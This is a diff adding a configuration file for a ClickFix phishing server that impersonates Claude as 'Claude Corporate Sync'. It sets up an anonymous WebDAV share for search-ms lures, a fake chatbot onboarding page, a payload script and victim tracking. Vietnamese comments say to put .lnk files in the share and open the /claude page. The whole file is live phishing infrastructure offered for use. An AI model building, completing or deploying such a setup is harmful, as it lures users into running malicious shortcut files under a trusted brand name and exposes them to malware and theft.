@@ -1,0 +1,39 @@
+# =============================================
+# ClickFix Server Configuration
+# Claude Phishing + search-ms WebDAV
+# =============================================
+
+app:
+  name: "Claude Corporate Sync"
+  version: "2.1.0"
+  debug: false
+
+server:
+  host: "0.0.0.0"
+  port: 80
+
+# ====================== WebDAV Configuration ======================
+webdav:
+  enabled: true
+  mount_path: "/dav"           # URL: https://domain.com/dav
+  root_folder: "dav"           # ← Đã đổi thành dav/
+  anonymous: true
+  verbose: 1
+
+# ====================== Template ======================
+template: "chatbot_onboarding.html"
+modal_template: "onboarding_template.html"  # or "old_onboard_template.html"
+
+# ====================== Other Settings ======================
+payload:
+  enabled: true
+  default_script: "default.js"
+
+tracking:
+  enabled: true
+
+# =============================================
+# Hướng dẫn:
+# - Đặt file .lnk vào thư mục dav/
+# - Truy cập trang: http://localhost:8080/claude
+# =============================================
